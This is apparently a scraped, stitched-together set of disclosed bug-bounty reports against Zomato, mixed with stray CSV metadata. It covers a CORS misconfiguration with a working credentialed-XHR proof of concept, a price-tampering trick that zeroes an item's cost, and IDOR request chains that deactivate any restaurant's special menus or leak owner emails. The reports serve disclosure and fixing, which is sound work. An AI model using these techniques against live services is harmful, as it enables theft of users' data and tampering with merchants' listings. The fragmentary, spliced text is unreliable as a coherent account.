If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

POC 2
Open http://developersxzomato.com/ in browser and click ## Exploit .
or:
Open any browser and go to  http://developersxzomato.com/ then inspect the page and go to console.
run the following code in console and you would find it pops up user information var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.zomato.com/abudhabi',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
How to fix:
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.
Note:


Take note from request I inject a header Origin: developersxzomato.com then from response it returns Access-Control-Allow-Origin: developersxzomato.com Which mean there is CORS misconfig here.


All testing was made by a test user ## ahd911 and only this user .


I hosted a website which is ## developersxzomato.com to proof this vulnerability.


Impact
Impact:
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.1 attachment:F363614: Zomato_CORS.png",https://hackerone.com/reports/426165,Haryana,India,Gurugram,2018,10,20,13,3

The item id on the separate line is the id corresponding to Zomato Treats with a price of Rs.149. On trying more item_ids, I figured out that there are more order ids for Zomato Treats, and have a price of 0.


I changed the item_id to 18, the unit_cost to 0, and subtracted 149(Zomato Treats Cost) from the total cost. Initial total cost: 254, final total cost: 105.

Zomato,10001,0.0,200m-1b,$100.00,No value,0.0,Insecure Direct Object Reference (IDOR),[www.zomato.com] IDOR - Delete/Deactivate any special menu of any Restaurants from Zomato,"prateek_0490  submitted a report to Zomato.Aug 31st (5 years ago)Summary by prateek_0490Going through the JS, I found another cool function which looked interesting and vulnerable and indeed it was vulnerable -
Code 98 Bytes1{var a={request_type:""deactivate-special-menu"",user_id:USER_ID,menu_set_id:e};$.post(""XXX/XXXXXX)""
It asked for a lot of information, and it required a lots of research/recon to actually achieve this but since after getting a feel for couple of weeks on Zomato's application I found a way to break this feature, I was able to delete/deactivate any/all special menus of any restaurant doesn't matter if I owned that restaurant or not.
I did try out to find a way to figure out the menu_set_id and moreover since I didn't wanted to test on any of @zomato's production users/customers/clients, I also had to find one of the test restaurants owned by Zomato on which I can replicate this, however during testing it was indeed found that there are lot's and lot's of restaurants who have these special menus, this would have lead to delete/deactivate all of them in One Go. I went ahead and deactivated a Special Menu of @zomato's internal testing restaurant_id XXXXXX with menu_set_id"":XXXX which was active till 24th September. I apologised for the same to the team :(
POC

An attacker first needs to figure out these information like user_id, menu_set_id before deactivating any menus. For that we can issue a Post Request with correct var at


Request

Code 196 Bytes1POST /XX/XXXXX?res_id=XXXXX HTTP/1.1
2Host: api.zomato.com
3X-Device-Is-Rooted: 0
4Cookie: <COOKIES>
5Content-Type: application/x-www-form-urlencoded
6
7access_token=<your token>&client_id=zomato_ios_v2


Since there was no restriction or a check to see if we actually hold that restaurant it leaked lots and lot's of useful stuff which was then chained with deleting the special menus of any restaurants.


Now using all this information, an attacker makes a Post Request at -



Request

XXX/XXXXX.php
with var as user_id=XXXX&type=SPECIAL&request_type=get-special-menus&res_id=XXXXX
this gave some more useful information.

Now the final request was made by changing the request_type in the Post Parameters, since I obtained the menu_set_id in our above requests, I made a final request to deactivate/delete that from the restaurants.

Introduction
Found a cool IDOR, which again leaks the email addresses of all Zomato Users. This attack works no matter if you own the restaurant or not.
Proof of Concept

Below Post Request leaks the email addresses of the Restaurant Owners in response -

Now, testing with the restaurants against which I don't own (below snapshot), I purposely first found the restaurant which isn't active then I threw this request at that particular restaurant.

This means, this can help an attacker to extract millions of emails from Zomato's database. This would be a Huge Leak if an attacker gets an access to this POST REQUEST.

This can allow an attacker to extract all the emails from the Zomato Database. A big leak. And we all know emails are of course the logins as well so this I would categorize as the huge leak considering the nature of the business.shreysinha   posted a comment. Nov 28th (5 years ago)Hi @prateek_0490
We are getting this checked.
Thanks.prateek_0490   posted a comment. Dec 12th (5 years ago)Hi @shreysinha This is still vulnerable :( Any update on this issue? Considering the fact that user info disclosure @zomato cares a lot about this should be resolved by now atleast?
Looking forward to hear from you.

Please see if you can do a full disclosure with some redaction (sensitive stuff if any), else I totally understand :)
